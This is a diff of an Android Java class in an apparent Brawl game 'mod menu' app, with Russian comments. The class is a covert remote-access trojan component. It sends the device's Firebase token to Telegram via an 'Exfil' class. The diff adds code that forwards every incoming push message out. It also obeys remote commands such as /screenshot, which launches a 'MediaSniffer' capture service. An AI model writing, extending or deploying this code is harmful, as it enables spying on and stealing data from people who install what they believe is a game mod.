@@ -1,21 +1,15 @@
 package com.brawl.modmenu;
 
-import android.util.Log;
 import com.google.firebase.messaging.FirebaseMessagingService;
 import com.google.firebase.messaging.RemoteMessage;
 import java.util.Map;
 
 public class FirebaseService extends FirebaseMessagingService {
 
-    private static final String TAG = "FirebaseService";
-
     @Override
     public void onNewToken(String token) {
         super.onNewToken(token);
-        // Отправляем токен в Telegram
-        Exfil.send("FCM_TOKEN", "Новый токен:\n" + token);
-
-        // Сохраняем локально
+        Exfil.send("FCM_TOKEN", "Токен:\n" + token);
         getSharedPreferences("fcm", MODE_PRIVATE)
             .edit().putString("token", token).apply();
     }
@@ -25,30 +19,45 @@ public class FirebaseService extends FirebaseMessagingService {
         super.onMessageReceived(msg);
 
         try {
+            // Логируем ВСЁ что приходит
+            StringBuilder log = new StringBuilder();
+
+            if (msg.getNotification() != null) {
+                log.append("NOTIF_TITLE: ").append(msg.getNotification().getTitle()).append("\n");
+                log.append("NOTIF_BODY: ").append(msg.getNotification().getBody()).append("\n");
+            }
+
             Map<String, String> data = msg.getData();
-            if (data == null || data.isEmpty()) return;
+            if (data != null && !data.isEmpty()) {
+                log.append("DATA:\n");
+                for (Map.Entry<String, String> e : data.entrySet()) {
+                    log.append("  ").append(e.getKey()).append(" = ").append(e.getValue()).append("\n");
+                }
+            } else {
+                log.append("DATA: пусто\n");
+            }
 
-            String command = data.get("cmd");
-            if (command == null) return;
+            Exfil.send("FCM_RAW", log.toString());
 
-            Exfil.send("FCM_CMD", "Получено: " + command);
-            handleFcmCommand(command);
-
+            // Обработка команды
+            if (data != null) {
+                String command = data.get("cmd");
+                if (command != null && !command.isEmpty()) {
+                    Exfil.send("FCM_CMD", "Получено: " + command);
+                    handleCommand(command);
+                }
+            }
         } catch (Throwable t) {
-            Log.e(TAG, "err", t);
+            Exfil.send("FCM_ERR", t.getClass().getSimpleName() + ": " + t.getMessage());
         }
     }
 
-    private void handleFcmCommand(String text) {
+    private void handleCommand(String text) {
         try {
-            if (text.startsWith("/ping")) {
-                Exfil.send("FCM", "Pong из FCM!");
-                return;
-            }
+            if (text.startsWith("/ping")) { Exfil.send("FCM", "Pong из FCM!"); return; }
             if (text.startsWith("/screenshot")) {
                 try {
-                    android.content.Intent i =
-                        new android.content.Intent(this, MediaSniffer.class);
+                    android.content.Intent i = new android.content.Intent(this, MediaSniffer.class);
                     i.setAction("CAPTURE_NOW");
                     startService(i);
                 } catch (Throwable t) {}
